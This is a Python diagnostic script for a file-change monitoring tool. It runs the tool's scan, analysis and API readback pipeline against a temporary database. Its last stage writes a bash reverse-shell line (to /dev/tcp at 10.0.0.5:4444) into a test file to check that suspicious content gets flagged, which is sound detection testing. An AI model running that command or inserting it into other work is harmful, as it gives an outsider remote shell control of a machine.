"""Exercise the file-change pipeline against an isolated sqlite database.

The script runs a synthetic baseline, modification, analysis, notification, and
API-readback flow without touching the local application database.

Run: python scripts/diagnose_pipeline.py
"""
import os
import sys
import tempfile
import time
import shutil
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

# Patch the database module before importing scanner or analysis code.
import sqlalchemy
from sqlalchemy.orm import sessionmaker
from core import database as _db  # noqa: E402

_TMP_DIR = Path(tempfile.mkdtemp(prefix="hashmon-diag-"))
_TMP_DB_URL = f"sqlite:///{_TMP_DIR / 'diag.db'}"

_db.engine = sqlalchemy.create_engine(_TMP_DB_URL, connect_args={"check_same_thread": False})
_db.SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=_db.engine)
_db.DATABASE_PATH = str(_TMP_DIR / "diag.db")
_db.DATABASE_URL = _TMP_DB_URL
_db.init_db()

from core import scanner            # noqa: E402
from core import background_analysis  # noqa: E402
from core.models import FileRecord, FileLog  # noqa: E402

scanner.SessionLocal = _db.SessionLocal
background_analysis.SessionLocal = _db.SessionLocal


def section(title: str) -> None:
    print(f"\n{'=' * 70}\n  {title}\n{'=' * 70}")


def dump_logs(label: str) -> None:
    s = _db.SessionLocal()
    try:
        logs = s.query(FileLog).order_by(FileLog.id).all()
        print(f"\n[{label}] FileLog rows ({len(logs)}):")
        for log in logs:
            print(
                f"  id={log.id:<3} "
                f"event={log.event_type:<8} "
                f"status={log.status:<10} "
                f"priority={log.priority:<10} "
                f"risk={log.risk_score!s:<5} "
                f"path={Path(log.path).name}"
            )
    finally:
        s.close()


def dump_records(label: str) -> None:
    s = _db.SessionLocal()
    try:
        recs = s.query(FileRecord).order_by(FileRecord.path).all()
        print(f"\n[{label}] FileRecord rows ({len(recs)}):")
        for r in recs:
            print(
                f"  path={Path(r.path).name:<24} "
                f"hash={r.hash[:8]}... "
                f"baseline={r.is_baseline} "
                f"size={r.size}"
            )
    finally:
        s.close()


def main() -> int:
    target = _TMP_DIR / "monitored"
    target.mkdir()
    user_file = target / "notes.txt"
    user_file.write_text("hello world\n")

    section("Stage 0 - Initial baseline scan")
    result = scanner.scan_and_baseline(str(target))
    print(f"scan_and_baseline result: {result}")
    dump_records("after baseline")
    dump_logs("after baseline")

    section("Stage 1 - Modify the file")
    time.sleep(1.1)
    user_file.write_text("hello world\nan extra line that was not in baseline\n")
    print(f"Modified: {user_file}")

    section("Stage 2 - compare_and_log")
    cl = scanner.compare_and_log(str(target))
    print(f"compare_and_log result: {cl}")
    dump_logs("after compare_and_log")

    section("Stage 3 - process_pending_analysis")
    background_analysis.update_monitor_state(False, [str(target)])
    processed = background_analysis.process_pending_analysis(batch_size=10)
    print(f"process_pending_analysis processed={processed} events")
    dump_logs("after analysis")

    section("Stage 4 - baseline API data")
    s = _db.SessionLocal()
    try:
        from sqlalchemy import case
        recs = s.query(FileRecord).order_by(FileRecord.path).all()
        for rec in recs:
            change_count = s.query(FileLog).filter(FileLog.path == rec.path).count()
            top = (
                s.query(FileLog)
                .filter(FileLog.path == rec.path)
                .order_by(
                    case(
                        (FileLog.priority == 'critical', 0),
                        (FileLog.priority == 'high', 1),
                        (FileLog.priority == 'medium', 2),
                        (FileLog.priority == 'low', 3),
                        (FileLog.priority == 'info', 4),
                        else_=5,
                    )
                )
                .first()
            )
            print(
                f"  {Path(rec.path).name:<24} "
                f"change_count={change_count} "
                f"highest_priority={top.priority if top else 'info'}"
            )
    finally:
        s.close()

    section("Stage 5 - timeline API data")
    s = _db.SessionLocal()
    try:
        rec = s.query(FileRecord).filter(FileRecord.path.like('%notes.txt')).first()
        stored_path = rec.path if rec else None
        print(f"stored FileRecord.path = {stored_path!r}")
        print(f"Path.resolve()         = {str(user_file.resolve())!r}")
        if not stored_path:
            print("  (no FileRecord found; cannot query timeline)")
        else:
            logs = (
                s.query(FileLog)
                .filter(FileLog.path == stored_path)
                .order_by(FileLog.timestamp.asc())
                .all()
            )
            print(f"timeline events for notes.txt ({len(logs)}):")
            for log in logs:
                print(
                    f"  ts={log.timestamp} event={log.event_type} "
                    f"status={log.status} priority={log.priority}"
                )
    finally:
        s.close()

    section("Stage 6 - FastAPI endpoint check")
    import json
    from fastapi.testclient import TestClient
    from core import api as api_mod
    api_mod.SessionLocal = _db.SessionLocal
    client = TestClient(api_mod.app)

    baseline = client.get("/api/baseline").json()
    print("\nGET /api/baseline ->")
    print(json.dumps(baseline, indent=2, default=str)[:1200])

    if baseline:
        path = baseline[0]["path"]
        timeline = client.get("/api/files/timeline", params={"path": path}).json()
        print(f"\nGET /api/files/timeline?path={path} ->")
        print(json.dumps(timeline, indent=2, default=str)[:1500])

    section("Stage 7 - suspicious content classification")
    threat_file = target / "network_callback.sh"
    threat_file.write_text(
        "#!/bin/bash\n"
        "# baseline content\n"
        "echo hello\n"
    )
    scanner.compare_and_log(str(target))
    time.sleep(1.1)
    threat_file.write_text(
        "#!/bin/bash\n"
        "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n"
    )
    scanner.compare_and_log(str(target))
    background_analysis.process_pending_analysis(batch_size=10)

    threat_baseline = client.get("/api/baseline").json()
    for row in threat_baseline:
        if row["path"].endswith("network_callback.sh"):
            print(
                f"  network_callback.sh -> change_count={row['change_count']} "
                f"highest_priority={row['highest_priority']}"
            )
            break

    try:
        shutil.rmtree(_TMP_DIR)
    except OSError:
        print(f"\n(tmp dir left in place: {_TMP_DIR})")

    print("\nDone.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
